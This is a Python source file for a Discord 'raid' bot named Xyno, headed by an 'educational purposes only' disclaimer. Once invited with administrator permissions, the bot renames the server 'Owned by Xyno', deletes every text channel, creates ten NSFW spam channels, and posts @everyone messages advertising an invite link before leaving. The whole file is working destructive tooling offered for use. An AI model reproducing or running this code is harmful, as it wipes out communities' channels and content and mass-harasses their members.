'''
Public Archive Xyno Build: Last edited 2025/07/14 12:19PM UTC

This code is for educational purposes only. Do not use it for malicious intent.
'''
__BOTTOKEN__ = input('Bot Token:')


import discord, asyncio
from discord.ext import commands
from colorama import init, Fore, Style


init(autoreset=True)
xyno = commands.Bot(command_prefix='!', intents=discord.Intents.all(), help_command=None) # We don't need any commands beacuse bot will automatically raid the server when its in.


@xyno.event
async def on_ready():
    print(f'Authorization Link: https://discord.com/api/oauth2/authorize?client_id={xyno.user.id}&permissions=8&scope=bot%20applications.commands')

@xyno.event
async def on_guild_join(guild):
    await guild.edit(community=False)
    await guild.edit(name='Owned by Xyno')
    print(f'{Fore.BLUE}[ATTEMPT]: Deleting all channels..{Style.RESET_ALL}')
    delete_tasks = [channel.delete() for channel in list(guild.text_channels)]
    deleted = await asyncio.gather(*delete_tasks, return_exceptions=True)
    for idx, (channel, result) in enumerate(zip(list(guild.text_channels), deleted)):
        if isinstance(result, Exception):
            print(f'{Fore.RED}[FAILURE] Could not delete channel {channel.name}: {result}{Style.RESET_ALL}')
        else:
            print(f'{Fore.GREEN}[SUCCESS] Deleted channel {channel.name}{Style.RESET_ALL}')

    print(f'[ATTEMPT]: Creating new channels..{Style.RESET_ALL}')
    create_tasks = [guild.create_text_channel('xyno-on-top') for _ in range(10)]
    new_channels = await asyncio.gather(*create_tasks)
    edit_tasks = [ch.edit(nsfw=True) for ch in new_channels]
    await asyncio.gather(*edit_tasks)
    for i, new_channel in enumerate(new_channels):
        print(f'{Fore.GREEN}[SUCCESS {i+1}] Created {new_channel.name}{Style.RESET_ALL}')

    print(f'{Fore.BLUE}[ATTEMPT]: Sending raid message in all text channels..{Style.RESET_ALL}')
    send_tasks = [channel.send('@everyone @here xyno ra1ded discord.gg/highed') for channel in guild.text_channels]
    sent = await asyncio.gather(*send_tasks, return_exceptions=True)
    for channel, result in zip(guild.text_channels, sent):
        if isinstance(result, Exception):
            print(f'{Fore.RED}[FAILURE] Could not send message in {channel.name}: {result}{Style.RESET_ALL}')
        else:
            print(f'{Fore.GREEN}[SUCCESS] Sent message in {channel.name}{Style.RESET_ALL}')

    await guild.leave()

xyno.run(__BOTTOKEN__)
